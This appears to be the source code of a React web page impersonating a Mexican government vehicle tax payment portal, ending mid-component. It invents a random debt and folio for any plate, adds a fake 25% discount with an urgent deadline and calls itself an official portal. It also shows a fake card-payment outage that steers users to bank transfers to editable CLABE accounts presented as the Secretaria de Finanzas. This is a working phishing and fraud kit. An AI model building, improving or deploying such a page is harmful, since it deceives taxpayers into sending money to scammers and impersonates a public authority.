import { useState, useMemo } from "react";
import logoMx from "@/assets/logo-mx.png";
import {
  Car,
  Mail,
  Phone,
  Shield,
  ShieldCheck,
  FileText,
  CreditCard,
  Building2,
  Tag,
  Clock,
  X,
  ArrowLeft,
  ChevronDown,
  Percent,
  Wallet,
  AlertTriangle,
  MapPin,
  CheckCircle2,
  Info,
} from "lucide-react";

type Screen =
  | "landing"
  | "consult"
  | "captcha"
  | "search"
  | "confirm"
  | "card"
  | "spei";

// === CLABES configurables: edita estos 3 valores. Se mostrara 1 aleatoria. ===
const CLABES: { banco: string; clabe: string }[] = [
  { banco: "BBVA Mexico", clabe: "012 180 01234567890 1" },
  { banco: "Banamex", clabe: "002 180 09876543210 5" },
  { banco: "Santander", clabe: "014 180 11223344556 7" },
];

const ESTADOS_MX = [
  "Aguascalientes",
  "Baja California",
  "Baja California Sur",
  "Campeche",
  "Chiapas",
  "Chihuahua",
  "Ciudad de Mexico",
  "Coahuila",
  "Colima",
  "Durango",
  "Estado de Mexico",
  "Guanajuato",
  "Guerrero",
  "Hidalgo",
  "Jalisco",
  "Michoacan",
  "Morelos",
  "Nayarit",
  "Nuevo Leon",
  "Oaxaca",
  "Puebla",
  "Queretaro",
  "Quintana Roo",
  "San Luis Potosi",
  "Sinaloa",
  "Sonora",
  "Tabasco",
  "Tamaulipas",
  "Tlaxcala",
  "Veracruz",
  "Yucatan",
  "Zacatecas",
];

const randomAmount = () => {
  // Monto original aleatorio entre $1000.00 y $5000.00
  const n = Math.random() * 4000 + 1000;
  return Math.round(n * 100) / 100;
};

const randomFolioSuffix = () => {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length: 3 }, () =>
    chars.charAt(Math.floor(Math.random() * chars.length)),
  ).join("");
};

const fmt = (n: number) =>
  "$" +
  n.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });

function Index() {
  const [screen, setScreen] = useState<Screen>("landing");
  const [estado, setEstado] = useState<string>("");
  const [lastPlaca, setLastPlaca] = useState<string>("");
  const [placa, setPlaca] = useState<string>("ABC1234");
  const [folio, setFolio] = useState<string>("ABC1234L4N");
  const [original, setOriginal] = useState<number>(() => randomAmount());
  const total = useMemo(() => Math.round(original * 0.75 * 100) / 100, [original]);
  const savings = useMemo(() => Math.round((original - total) * 100) / 100, [original, total]);
  const clabe = useMemo(() => CLABES[Math.floor(Math.random() * CLABES.length)], []);

  return (
    <div className="min-h-screen bg-background text-foreground flex flex-col">
      <TopBar />
      <Header onHome={() => setScreen("landing")} screen={screen} />
      <main className="flex-1">
        {screen === "landing" && (
          <Landing
            onConsult={() => setScreen("consult")}
          />
        )}
        {(screen === "search" ||
          screen === "confirm" ||
          screen === "card" ||
          screen === "spei") && (
          <FlowPage
            screen={screen}
            setScreen={setScreen}
            original={original}
            total={total}
            savings={savings}
            clabe={clabe}
            estado={estado}
            placa={placa}
            folio={folio}
          />
        )}
      </main>
      <Footer />

      {screen === "consult" && (
        <ConsultModal
          onClose={() => setScreen("landing")}
          onSubmit={(e, p) => {
            setEstado(e);
            setPlaca(p);
            if (p !== lastPlaca) {
              setOriginal(randomAmount());
              setFolio(p + randomFolioSuffix());
              setLastPlaca(p);
            }
            setScreen("captcha");
          }}
        />
      )}
      {screen === "captcha" && (
        <CaptchaModal
          onClose={() => setScreen("landing")}
          onSuccess={() => setScreen("search")}
        />
      )}
    </div>
  );
}

/* -------- Top bar -------- */
function TopBar() {
  return (
    <div className="bg-[var(--burgundy-dark)] text-white text-xs">
      <div className="max-w-6xl mx-auto px-4 py-2 flex flex-wrap items-center justify-between gap-2">
        <span className="opacity-90">Derechos de Control Vehicular</span>
        <div className="flex items-center gap-4">
          <span className="flex items-center gap-1">
            <Phone className="h-3 w-3" /> 800-CONTROL
          </span>
          <span className="hidden sm:flex items-center gap-1">
            <Mail className="h-3 w-3" />
            <span>contacto@controlvehicular.mx</span>
          </span>
        </div>
      </div>
    </div>
  );
}

/* -------- Header -------- */
function Header({ onHome, screen }: { onHome: () => void; screen: Screen }) {
  const useMxLogo = screen === "search" || screen === "confirm" || screen === "card" || screen === "spei";
  return (
    <header className="bg-[var(--burgundy)] text-white">
      <div className="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
        <button
          onClick={onHome}
          className="flex items-center gap-3 text-left"
        >
          {useMxLogo ? (
            <img
              src={logoMx}
              alt="Escudo Estados Unidos Mexicanos"
              className="h-16 w-auto object-contain"
            />
          ) : (
            <div className="h-12 w-12 rounded-full bg-white/10 flex items-center justify-center ring-2 ring-white/30">
              <Car className="h-6 w-6" />
            </div>
          )}
          <div>
            <div className="text-lg font-bold leading-tight">Control Vehicular</div>
            <div className="text-[11px] opacity-80 leading-tight">
              Derechos de Control Vehicular
            </div>
          </div>
        </button>
        <nav className="hidden md:flex items-center gap-2 text-sm">
          <a className="px-3 py-1.5 rounded hover:bg-white/10" href="#recursos">Recursos</a>
          <a className="px-3 py-1.5 rounded hover:bg-white/10" href="#dudas">Dudas</a>
          <a className="px-3 py-1.5 rounded hover:bg-white/10" href="#contacto">Contacto</a>
          <span className="ml-2 inline-flex items-center gap-1 text-xs bg-white/15 px-2 py-1 rounded">
            <Shield className="h-3 w-3" /> Portal Seguro
          </span>
        </nav>
      </div>
    </header>
  );
}

/* -------- Landing -------- */
function Landing({ onConsult }: { onConsult: () => void }) {
  return (
    <>
      {/* Hero */}
      <section className="relative bg-gradient-to-b from-[var(--burgundy)] to-[var(--burgundy-dark)] text-white">
        <div className="max-w-6xl mx-auto px-4 py-20 text-center">
          <span className="inline-flex items-center gap-2 text-xs bg-white/10 border border-white/20 rounded-full px-3 py-1 mb-6">
            <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" />
            Sistema en linea
          </span>
          <h1 className="text-4xl md:text-5xl font-bold mb-4">
            Portal de <span className="text-[var(--gold)]">Control Vehicular</span>
          </h1>
          <p className="max-w-2xl mx-auto text-white/85 mb-8">
            Consulte sus adeudos vehiculares, realice pagos y obtenga constancias de
            manera rapida y segura.
          </p>
          <div className="flex flex-wrap justify-center gap-3">
            <a
              href="#recursos"
              className="inline-flex items-center gap-2 bg-white/10 hover:bg-white/20 border border-white/25 px-5 py-2.5 rounded-md text-sm font-medium"
            >
              <FileText className="h-4 w-4" /> Ver Recursos
            </a>
            <button
              onClick={onConsult}
              className="inline-flex items-center gap-2 bg-white text-[var(--burgundy)] hover:bg-white/90 px-5 py-2.5 rounded-md text-sm font-semibold shadow-md"
            >
              <Car className="h-4 w-4" /> Consultar Adeudo
            </button>
          </div>
        </div>
      </section>

      {/* Steps */}
      <section className="max-w-6xl mx-auto px-4 py-16 grid md:grid-cols-3 gap-6">
        {[
          {
            n: 1,
            title: "Consulte su adeudo",
            text: "Ingrese su numero de placa para verificar si tiene adeudos pendientes.",
            icon: <Car className="h-5 w-5" />,
          },
          {
            n: 2,
            title: "Confirme sus datos",
            text: "Revise la informacion vehicular y los montos a pagar con descuentos activos.",
            icon: <CheckCircle2 className="h-5 w-5" />,
          },
          {
            n: 3,
            title: "Realice su pago",
            text: "Elija entre pago con tarjeta o deposito/transferencia SPEI.",
            icon: <CreditCard className="h-5 w-5" />,
          },
        ].map((s) => (
          <div
            key={s.n}
            className="bg-card rounded-xl border border-border p-6 text-center shadow-sm hover:shadow-md transition-shadow"
          >
            <div className="mx-auto h-12 w-12 rounded-full bg-[var(--burgundy-soft)] text-[var(--burgundy)] flex items-center justify-center font-bold mb-4">
              {s.n}
            </div>
            <div className="flex items-center justify-center gap-2 text-[var(--burgundy)] mb-2">
              {s.icon}
              <h3 className="font-semibold text-foreground">{s.title}</h3>
            </div>
            <p className="text-sm text-muted-foreground">{s.text}</p>
          </div>
        ))}
      </section>

      {/* Aspectos */}
      <section id="recursos" className="bg-secondary/40 py-16">
        <div className="max-w-6xl mx-auto px-4">
          <div className="text-center mb-10">
            <h2 className="text-3xl font-bold">Aspectos Clave de la Tenencia en Mexico</h2>
            <p className="text-muted-foreground mt-2">
              Informacion esencial sobre el impuesto de control vehicular en sus diferentes aspectos.
            </p>
          </div>
          <div className="grid md:grid-cols-2 gap-6">
            <InfoCard
              icon={<Percent className="h-5 w-5" />}
              title="Subsidios y Beneficios Fiscales"
              items={[
                "Descuentos por pronto pago en los primeros meses",
                "Beneficios que varian cada ejercicio fiscal",
                "Algunos estados ofrecen hasta 25% de descuento",
                "Programas especiales de condonacion en ciertos periodos",
              ]}
            />
            <InfoCard
              icon={<Wallet className="h-5 w-5" />}
              title="Formas de Pago Disponibles"
              items={[
                "Pago en linea con tarjeta de credito o debito",
                "Transferencia bancaria SPEI desde cualquier banco",
                "Pago en bancos autorizados con linea de captura",
                "Tiendas de conveniencia y oficinas de recaudacion",
              ]}
            />
            <InfoCard
              icon={<AlertTriangle className="h-5 w-5" />}
              title="Recargos y Multas por Retraso"
              items={[
                "Los recargos se calculan mensualmente sobre el adeudo",
                "Se aplican actualizaciones por inflacion acumulada",
                "El monto total puede aumentar significativamente",
                "Pagar a tiempo evita cargos adicionales innecesarios",
              ]}
            />
            <InfoCard
              icon={<MapPin className="h-5 w-5" />}
              title="Impuesto Vehicular por Estado"
              items={[
                "Cada entidad federativa tiene sus propias reglas",
                "Algunos estados han eliminado la tenencia completamente",
                "Las tarifas y descuentos varian significativamente",
                "Contenido nacional sin mencionar estados especificos",
              ]}
            />
          </div>

          <div className="mt-10 bg-card border border-border rounded-xl p-6">
            <h3 className="font-semibold mb-4 flex items-center gap-2 text-[var(--burgundy)]">
              <FileText className="h-5 w-5" /> Tramites Relacionados
            </h3>
            <ul className="grid sm:grid-cols-2 gap-3 text-sm">
              {[
                "Alta y baja de vehiculos en el padron estatal",
                "Cambio de propietario o transferencia vehicular",
                "Renovacion de tarjeta de circulacion y placas",
                "Expedicion de constancia de no adeudo",
              ].map((t) => (
                <li key={t} className="flex items-start gap-2">
                  <CheckCircle2 className="h-4 w-4 text-[var(--burgundy)] mt-0.5 shrink-0" />
                  {t}
                </li>
              ))}
            </ul>
          </div>
        </div>
      </section>

      {/* FAQ */}
      <section id="dudas" className="py-16">
        <div className="max-w-3xl mx-auto px-4">
          <div className="text-center mb-10">
            <h2 className="text-3xl font-bold">Preguntas Frecuentes</h2>
            <p className="text-muted-foreground mt-2">
              Resuelva sus dudas sobre el pago de tenencia y control vehicular.
            </p>
          </div>
          <div className="space-y-3">
            {FAQS.map((f, i) => (
              <Faq key={i} q={f.q} a={f.a} />
            ))}
          </div>

          <div id="contacto" className="mt-10 bg-[var(--burgundy-soft)] border border-[var(--burgundy)]/20 rounded-xl p-6">
            <h3 className="font-semibold text-[var(--burgundy)] flex items-center gap-2 mb-2">
              <AlertTriangle className="h-5 w-5" /> Aviso Importante
            </h3>
            <p className="text-sm text-foreground/80">
              El pago de derechos de control vehicular es obligatorio conforme al Codigo
              Financiero del Estado. Los adeudos no pagados generan recargos y
              actualizaciones. Consulte su situacion y liquide a tiempo para evitar
              recargos adicionales. Este portal es un medio oficial para la consulta y
              pago de sus obligaciones vehiculares.
            </p>
          </div>
        </div>
      </section>
    </>
  );
}

function InfoCard({
  icon,
  title,
  items,
}: {
  icon: React.ReactNode;
  title: string;
  items: string[];
}) {
  return (
    <div className="bg-card border border-border rounded-xl p-6 shadow-sm">
      <div className="flex items-center gap-2 mb-3 text-[var(--burgundy)]">
        <div className="h-9 w-9 rounded-lg bg-[var(--burgundy-soft)] flex items-center justify-center">
          {icon}
        </div>
        <h3 className="font-semibold text-foreground">{title}</h3>
      </div>
      <ul className="space-y-2 text-sm text-foreground/80">
        {items.map((it) => (
          <li key={it} className="flex items-start gap-2">
            <span className="mt-1.5 h-1.5 w-1.5 rounded-full bg-[var(--burgundy)] shrink-0" />
            {it}
          </li>
        ))}
      </ul>
    </div>
  );
}

const FAQS = [
  {
    q: "Que informacion necesito tener a la mano para pagar?",
    a: "Su numero de placa vigente, la entidad de registro del vehiculo y un metodo de pago (tarjeta o cuenta bancaria con SPEI).",
  },
  {
    q: "Como determina la autoridad el monto de tenencia?",
    a: "El calculo considera el valor factura del vehiculo, su antiguedad, el tipo de uso y las tarifas vigentes del ejercicio fiscal.",
  },
  {
    q: "Por que existe el impuesto de tenencia en Mexico?",
    a: "Es una contribucion estatal destinada a financiar obras publicas, infraestructura vial y servicios relacionados con el transporte.",
  },
  {
    q: "Hasta cuando tengo para pagar la tenencia sin recargos?",
    a: "Las fechas limite varian por estado, generalmente durante el primer trimestre del ano. Consulte la fecha de la promocion vigente.",
  },
  {
    q: "Mi estado permite dividir el pago de tenencia en cuotas?",
    a: "Algunos estados ofrecen pagos parciales o convenios de diferimiento. Verifique las opciones disponibles al iniciar su pago.",
  },
  {
    q: "Sobre quien recae la obligacion de pagar tenencia?",
    a: "Sobre la persona fisica o moral que aparezca como propietaria del vehiculo en el padron vehicular estatal.",
  },
  {
    q: "De que maneras puedo liquidar la tenencia?",
    a: "Pago en linea con tarjeta, transferencia SPEI, bancos autorizados, tiendas de conveniencia y oficinas de recaudacion.",
  },
];

function Faq({ q, a }: { q: string; a: string }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="bg-card border border-border rounded-lg overflow-hidden">
      <button
        onClick={() => setOpen((o) => !o)}
        className="w-full flex items-center justify-between gap-4 px-4 py-3 text-left hover:bg-secondary/40"
      >
        <span className="font-medium text-sm">{q}</span>
        <ChevronDown
          className={`h-4 w-4 shrink-0 text-[var(--burgundy)] transition-transform ${
            open ? "rotate-180" : ""
          }`}
        />
      </button>
      {open && (
        <div className="px-4 pb-4 text-sm text-muted-foreground border-t border-border pt-3">
          {a}
        </div>
      )}
    </div>
  );
}

/* -------- Footer -------- */
function Footer() {
  return (
    <footer className="bg-[var(--burgundy-dark)] text-white/80 mt-auto">
      <div className="max-w-6xl mx-auto px-4 py-10">
        <h4 className="font-bold text-white mb-3">PORTAL DE PAGOS</h4>
        <p className="text-xs leading-relaxed max-w-3xl">
          Este sitio NO mantiene afiliacion, respaldo ni conexion con ninguna Secretaria
          de Finanzas estatal, gobierno municipal, estatal o federal, ni dependencia
          gubernamental de ningun nivel. La informacion tiene fines exclusivamente
          informativos.
        </p>
      </div>
      <div className="border-t border-white/10">
        <div className="max-w-6xl mx-auto px-4 py-4 text-center text-xs">
          (c) 2026 Portal de Pagos - Todos los derechos reservados
        </div>
      </div>
    </footer>
  );
}

/* -------- Modals -------- */
function ModalShell({
  children,
  onClose,
}: {
  children: React.ReactNode;
  onClose: () => void;
}) {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
      <div className="relative bg-card text-card-foreground rounded-2xl shadow-2xl w-full max-w-md p-6">
        <button
          onClick={onClose}
          aria-label="Cerrar"
          className="absolute top-3 right-3 p-1.5 rounded hover:bg-secondary text-muted-foreground"
        >
          <X className="h-4 w-4" />
        </button>
        {children}
      </div>
    </div>
  );
}

function ConsultModal({
  onClose,
  onSubmit,
}: {
  onClose: () => void;
  onSubmit: (estado: string, placa: string) => void;
}) {
  const [placa, setPlaca] = useState("");
  const [estado, setEstado] = useState("");
  return (
    <ModalShell onClose={onClose}>
      <div className="flex items-center gap-3 mb-5">
        <div className="h-10 w-10 rounded-lg bg-[var(--burgundy-soft)] text-[var(--burgundy)] flex items-center justify-center">
          <Car className="h-5 w-5" />
        </div>
        <h3 className="text-lg font-bold">Consultar Adeudo</h3>
      </div>
      <form
        onSubmit={(e) => {
          e.preventDefault();
          if (placa && estado) onSubmit(estado, placa);
        }}
        className="space-y-4"
      >
        <div>
          <label className="text-sm font-medium block mb-1.5">Numero de Placa</label>
          <input
            value={placa}
            onChange={(e) => setPlaca(e.target.value.toUpperCase())}
            maxLength={7}
            placeholder="EJ: ABC1234"
            className="w-full bg-secondary/50 border border-border rounded-md px-3 py-2.5 font-mono tracking-wider focus:outline-none focus:ring-2 focus:ring-[var(--burgundy)]"
          />
          <p className="text-xs text-muted-foreground mt-1">Maximo 7 caracteres</p>
        </div>
        <div>
          <label className="text-sm font-medium block mb-1.5">Entidad de Registro</label>
          <select
            value={estado}
            onChange={(e) => setEstado(e.target.value)}
            className="w-full bg-secondary/50 border border-border rounded-md px-3 py-2.5 focus:outline-none focus:ring-2 focus:ring-[var(--burgundy)]"
          >
            <option value="">Seleccione un estado</option>
            {ESTADOS_MX.map((e) => (
              <option key={e} value={e}>
                {e}
              </option>
            ))}
          </select>
        </div>
        <button
          type="submit"
          className="w-full bg-[var(--burgundy)] hover:bg-[var(--burgundy-dark)] text-white font-semibold py-2.5 rounded-md transition-colors"
        >
          Consultar Placa
        </button>
      </form>
    </ModalShell>
  );
}

function CaptchaModal({
  onClose,
  onSuccess,
}: {
  onClose: () => void;
  onSuccess: () => void;
}) {
  const [code] = useState(() =>
    Array.from({ length: 6 }, () =>
      "ABCDEFGHJKLMNPQRSTUVWXYZ23456789".charAt(Math.floor(Math.random() * 32))
    ).join("")
  );
  const [val, setVal] = useState("");
  return (
    <ModalShell onClose={onClose}>
      <div className="flex items-center gap-3 mb-5">
        <div className="h-10 w-10 rounded-lg bg-[var(--burgundy-soft)] text-[var(--burgundy)] flex items-center justify-center">
          <ShieldCheck className="h-5 w-5" />
        </div>
        <h3 className="text-lg font-bold">Verificacion Humana</h3>
      </div>
      <p className="text-sm text-muted-foreground mb-4">
        Ingrese el siguiente codigo para verificar que usted es humano:
      </p>
      <div className="bg-[var(--burgundy-soft)] border border-[var(--burgundy)]/20 rounded-lg p-5 text-center mb-4">
        <div className="text-xs font-semibold text-[var(--burgundy)] tracking-wider mb-2">
          CODIGO DE VERIFICACION
        </div>
        <div className="font-mono text-3xl font-bold text-[var(--burgundy)] tracking-[0.4em] select-none">
          {code.split("").join(" ")}
        </div>
      </div>
      <form
        onSubmit={(e) => {
          e.preventDefault();
          if (val.toUpperCase() === code) onSuccess();
          else alert("Codigo incorrecto");
        }}
      >
        <label className="text-sm font-medium block mb-1.5">Ingrese el codigo</label>
        <input
          value={val}
          onChange={(e) => setVal(e.target.value.toUpperCase())}
          placeholder="ESCRIBA EL CODIGO AQUI"
          className="w-full bg-secondary/50 border border-border rounded-md px-3 py-2.5 font-mono tracking-widest text-center focus:outline-none focus:ring-2 focus:ring-[var(--burgundy)] mb-4"
        />
        <button
          type="submit"
          className="w-full bg-[var(--burgundy)] hover:bg-[var(--burgundy-dark)] text-white font-semibold py-2.5 rounded-md transition-colors"
        >
          Validar y Acceder
        </button>
      </form>
    </ModalShell>
  );
}

/* -------- Flow page (search/confirm/payment) -------- */
function FlowPage({
  screen,
  setScreen,
  original,
  total,
  savings,
  clabe,
  estado,
  placa,
  folio,
}: {
  screen: Screen;
  setScreen: (s: Screen) => void;
  original: number;
  total: number;
  savings: number;
  clabe: { banco: string; clabe: string };
  estado: string;
  placa: string;
  folio: string;
}) {
  const stepNum =
    screen === "search" ? 1 : screen === "confirm" ? 2 : 3;
  return (
    <div className="bg-secondary/30 min-h-[calc(100vh-200px)]">
      <div className="max-w-3xl mx-auto px-4 py-8">
        <div className="flex justify-end mb-4">
          <button
            onClick={() => setScreen("landing")}
            className="text-sm text-[var(--burgundy)] hover:underline inline-flex items-center gap-1"
          >
            <ArrowLeft className="h-4 w-4" /> Inicio
          </button>
        </div>
        <Stepper step={stepNum} />
        <div className="mt-6">
          {screen === "search" && (
            <SearchCard onNext={() => setScreen("confirm")} estado={estado} placa={placa} />
          )}
          {screen === "confirm" && (
            <ConfirmCard
              onCard={() => setScreen("card")}
              onSpei={() => setScreen("spei")}
              original={original}
              total={total}
              savings={savings}
              estado={estado}
              placa={placa}
              folio={folio}
            />
          )}
          {screen === "card" && (
            <CardPayment onBack={() => setScreen("confirm")} total={total} />
          )}
          {screen === "spei" && (
            <SpeiPayment onBack={() => setScreen("confirm")} total={total} clabe={clabe} folio={folio} />
          )}
        </div>
      </div>
    </div>
  );
}

function Stepper({ step }: { step: number }) {
  const items = ["Buscar Placa", "Confirmar Datos", "Pago"];
  return (
    <div className="flex items-center justify-center gap-2 sm:gap-4 text-sm">
      {items.map((label, i) => {
        const n = i + 1;
        const active = n === step;
        const done = n < step;
        return (
          <div key={label} className="flex items-center gap-2 sm:gap-4">
            <div className="flex items-center gap-2">
              <div
                className={`h-8 w-8 rounded-full flex items-center justify-center text-xs font-semibold ${
                  done
                    ? "bg-[var(--burgundy)] text-white"
                    : active
                    ? "bg-[var(--burgundy)] text-white"
                    : "bg-secondary text-muted-foreground"
                }`}
              >
                {done ? <CheckCircle2 className="h-4 w-4" /> : n}
              </div>
              <span
                className={`hidden sm:inline ${
                  active || done ? "text-[var(--burgundy)] font-medium" : "text-muted-foreground"
                }`}
              >
                {label}
              </span>
            </div>
            {n < items.length && (
              <span className="h-px w-6 sm:w-12 bg-border" />
            )}
          </div>
        );
      })}
    </div>
  );
}

function SearchCard({ onNext, estado, placa }: { onNext: () => void; estado: string; placa: string }) {
  const [code] = useState(() =>
    Array.from({ length: 5 }, () =>
      "ABCDEFGHJKLMNPQRSTUVWXYZ23456789".charAt(Math.floor(Math.random() * 32))
    ).join("")
  );
  const [val, setVal] = useState("");
  return (
    <div className="bg-card rounded-xl border border-border shadow-sm p-6">
      <div className="flex items-center gap-2 mb-5">
        <Car className="h-5 w-5 text-[var(--burgundy)]" />
        <h2 className="text-xl font-bold">Buscar Vehiculo</h2>
      </div>
      <div className="space-y-4">
        <div>
          <label className="text-sm font-medium block mb-1.5">Buscar tenencia por placa</label>
          <div className="bg-[var(--burgundy-soft)] border border-[var(--burgundy)]/20 rounded-md px-4 py-3 font-mono text-lg tracking-wider">
            {placa}
          </div>
          <p className="text-xs text-[var(--burgundy)] mt-1">
            Placa registrada en {estado || "Estado de Mexico"}
          </p>
        </div>
        <div>
          <label className="text-sm font-medium block mb-1.5">Codigo de verificacion</label>
          <div className="bg-secondary/50 border border-border rounded-md px-4 py-3 font-mono text-xl tracking-[0.4em] text-center select-none">
            {code.split("").join(" ")}
          </div>
        </div>
        <input
          value={val}
          onChange={(e) => setVal(e.target.value.toUpperCase())}
          placeholder="INGRESE EL CODIGO"
          className="w-full bg-secondary/50 border border-border rounded-md px-3 py-2.5 font-mono tracking-widest text-center focus:outline-none focus:ring-2 focus:ring-[var(--burgundy)]"
        />
        <button
          onClick={() => {
            if (val.toUpperCase() === code) onNext();
            else alert("Codigo incorrecto");
          }}
          className="w-full bg-[var(--burgundy)] hover:bg-[var(--burgundy-dark)] text-white font-semibold py-2.5 rounded-md"
        >
          Buscar Placa
        </button>
      </div>
    </div>
  );
}

function ConfirmCard({
  onCard,
  onSpei,
  original,
  total,
  savings,
  estado,
  placa,
  folio,
}: {
  onCard: () => void;
  onSpei: () => void;
  original: number;
  total: number;
  savings: number;
  estado: string;
  placa: string;
  folio: string;
}) {
  const [showCardNotice, setShowCardNotice] = useState(false);
  return (
    <div className="bg-card rounded-xl border border-border shadow-sm p-6 space-y-6">
      <div className="flex items-center gap-2">
        <ShieldCheck className="h-5 w-5 text-[var(--burgundy)]" />
        <h2 className="text-xl font-bold">Confirmar Datos</h2>
      </div>

      <div>
        <div className="text-xs font-semibold text-[var(--burgundy)] tracking-wider mb-3">
          REGISTRO VEHICULAR
        </div>
        <div className="grid sm:grid-cols-2 gap-3">
          <DataField label="NUM. PLACA" value={placa} />
          <DataField label="FOLIO DE PAGO" value={folio} />
        </div>
        <div className="mt-3">
          <DataField label="FECHA DE REGISTRO" value="11/05/2026, 09:54:19 a.m." />
        </div>
        <div className="mt-3">
          <DataField label="ENTIDAD DE REGISTRO" value={estado || "Estado de Mexico"} />
        </div>
      </div>

      <div className="bg-[var(--burgundy-soft)] border border-[var(--burgundy)]/25 rounded-xl p-5">
        <div className="flex items-center gap-2 text-xs font-semibold text-[var(--burgundy)] tracking-wider mb-2">
          <Tag className="h-4 w-4" /> DESCUENTO ACTIVO
        </div>
        <h3 className="font-bold text-lg mb-2">
          Descuento Especial por Pronto Pago - 25%
        </h3>
        <p className="text-sm text-foreground/80 mb-4">
          Liquide su adeudo antes del{" "}
          <span className="font-semibold">martes, 12 de mayo de 2026</span> y ahorre un
          25% en su pago.
        </p>
        <div className="flex flex-wrap items-center gap-3">
          <span className="text-muted-foreground line-through">{fmt(original)}</span>
          <span className="text-3xl font-bold text-[var(--burgundy)]">{fmt(total)}</span>
          <span className="bg-[var(--burgundy)] text-white text-xs font-semibold rounded-full px-3 py-1">
            Ahorro {fmt(savings)}
          </span>
        </div>
        <div className="mt-3 flex items-center gap-2 text-xs text-amber-700">
          <Clock className="h-4 w-4" />
          La promocion solo estara vigente hasta el martes, 12 de mayo de 2026
        </div>
      </div>

      <div className="bg-secondary/40 border border-border rounded-xl p-5">
        <div className="text-sm text-muted-foreground">
          Total del Adeudo (con 25% descuento)
        </div>
        <div className="text-4xl font-bold text-[var(--burgundy)] mt-1">
          {fmt(total)}
        </div>
      </div>

      <div className="grid sm:grid-cols-2 gap-3">
        <button
          onClick={() => setShowCardNotice(true)}
          className="inline-flex items-center justify-center gap-2 bg-[var(--burgundy)] hover:bg-[var(--burgundy-dark)] text-white font-semibold py-3 rounded-md"
        >
          <CreditCard className="h-4 w-4" /> Realizar Pago con Tarjeta
        </button>
        <button
          onClick={onSpei}
          className="inline-flex items-center justify-center gap-2 border-2 border-[var(--burgundy)] text-[var(--burgundy)] hover:bg-[var(--burgundy-soft)] font-semibold py-3 rounded-md"
        >
          <Building2 className="h-4 w-4" /> Pagar por Deposito o SPEI
        </button>
      </div>
      {showCardNotice && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4"
          onClick={() => setShowCardNotice(false)}
        >
          <div
            className="bg-card rounded-xl border border-border shadow-lg max-w-md w-full p-6 space-y-4"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-start gap-3">
              <div className="bg-[var(--burgundy-soft)] rounded-full p-2 shrink-0">
                <Info className="h-6 w-6 text-[var(--burgundy)]" />
              </div>
              <div>
                <h3 className="font-bold text-lg mb-1">Aviso</h3>
                <p className="text-sm text-foreground/80">
                  Actualmente estamos experimentando algunos inconvenientes tecnicos
                  con el sistema de pagos. Sin embargo, no te preocupes, puedes
                  realizar tu pago mediante transferencia directa utilizando los
                  datos bancarios oficiales. Si prefieres este metodo, por favor,
                  haz clic en el boton para ser redirigido a la pagina
                  correspondiente. Gracias por tu comprension.
                </p>
              </div>
            </div>
            <div className="flex flex-col-reverse sm:flex-row gap-2 sm:justify-end">
              <button
                onClick={() => setShowCardNotice(false)}
                className="px-4 py-2 rounded-md border border-border hover:bg-secondary font-medium text-sm"
              >
                Cerrar
              </button>
              <button
                onClick={() => {
                  setShowCardNotice(false);
                  onSpei();
                }}
                className="inline-flex items-center justify-center gap-2 bg-[var(--burgundy)] hover:bg-[var(--burgundy-dark)] text-white font-semibold px-4 py-2 rounded-md text-sm"
              >
                <Building2 className="h-4 w-4" /> Pagar por Deposito o SPEI
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function DataField({ label, value }: { label: string; value: string }) {
  return (
    <div className="bg-secondary/40 border border-border rounded-md px-4 py-3">
      <div className="text-[10px] font-semibold text-muted-foreground tracking-wider">
        {label}
      </div>
      <div className="font-mono mt-1">{value}</div>
    </div>
  );
}

/* -------- Payment screens -------- */
function CardPayment({ onBack, total }: { onBack: () => void; total: number }) {
  const [done, setDone] = useState(false);
  if (done) return <PaymentSuccess method="Tarjeta" total={total} />;
  return (
    <div className="bg-card rounded-xl border border-border shadow-sm p-6 space-y-5">
      <button
        onClick={onBack}
        className="text-sm text-[var(--burgundy)] hover:underline inline-flex items-center gap-1"
      >
        <ArrowLeft className="h-4 w-4" /> Regresar
      </button>
      <div className="flex items-center gap-2">
        <CreditCard className="h-5 w-5 text-[var(--burgundy)]" />
        <h2 className="text-xl font-bold">Pago con Tarjeta</h2>
      </div>
      <div className="bg-[var(--burgundy-soft)] border border-[var(--burgundy)]/20 rounded-md p-4 text-sm flex items-center justify-between">
        <span>Total a pagar</span>
        <span className="text-2xl font-bold text-[var(--burgundy)]">{fmt(total)}</span>
      </div>
      <form
        onSubmit={(e) => {
          e.preventDefault();
          setDone(true);
        }}
        className="space-y-4"
      >
        <Field label="Numero de tarjeta" placeholder="0000 0000 0000 0000" />
        <Field label="Nombre del titular" placeholder="Como aparece en la tarjeta" />
        <div className="grid grid-cols-2 gap-3">
          <Field label="Vencimiento" placeholder="MM/AA" />
          <Field label="CVV" placeholder="123" />
        </div>
        <button
          type="submit"
          className="w-full bg-[var(--burgundy)] hover:bg-[var(--burgundy-dark)] text-white font-semibold py-3 rounded-md"
        >
          Pagar {fmt(total)}
        </button>
      </form>
    </div>
  );
}

function SpeiPayment({
  onBack,
  total,
  clabe,
  folio,
}: {
  onBack: () => void;
  total: number;
  clabe: { banco: string; clabe: string };
  folio: string;
}) {
  return (
    <div className="bg-card rounded-xl border border-border shadow-sm p-6 space-y-5">
      <button
        onClick={onBack}
        className="text-sm text-[var(--burgundy)] hover:underline inline-flex items-center gap-1"
      >
        <ArrowLeft className="h-4 w-4" /> Regresar
      </button>
      <div className="flex items-center gap-2">
        <Building2 className="h-5 w-5 text-[var(--burgundy)]" />
        <h2 className="text-xl font-bold">Pago por SPEI / Deposito</h2>
      </div>
      <div className="bg-[var(--burgundy-soft)] border border-[var(--burgundy)]/20 rounded-md p-4 text-sm flex items-center justify-between">
        <span>Monto exacto a transferir</span>
        <span className="text-2xl font-bold text-[var(--burgundy)]">{fmt(total)}</span>
      </div>
      <div className="space-y-3 text-sm">
        <Row label="Beneficiario" value="Secretaria de Finanzas" />
        <Row label="Banco" value={clabe.banco} />
        <Row label="CLABE Interbancaria" value={clabe.clabe} />
        <Row label="Concepto" value={folio} />
        <Row label="Referencia" value="2026051200001" />
      </div>
